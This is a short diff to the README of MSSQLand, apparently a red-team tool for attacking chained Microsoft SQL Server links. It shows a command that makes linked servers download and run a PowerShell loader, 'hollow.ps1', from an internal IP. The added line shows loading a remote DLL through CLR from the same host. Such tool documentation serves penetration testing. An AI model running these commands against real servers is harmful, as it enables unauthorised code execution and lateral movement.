@@ -162,6 +162,8 @@ Great! Now you can directly reach out to your loader with:
 MSSQLand.exe /t:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04:Jacquard /a:pwshdl "172.16.118.218/d/g/hollow.ps1"
 ```
 
+Or even use Common Language Runtime (CLR) to load remotely a library with `/a:clr \"http://172.16.118.218/d/SqlLibrary.dll\"`.
+
 ## Options and Features ⚙️
 
 ### Too Much Output?
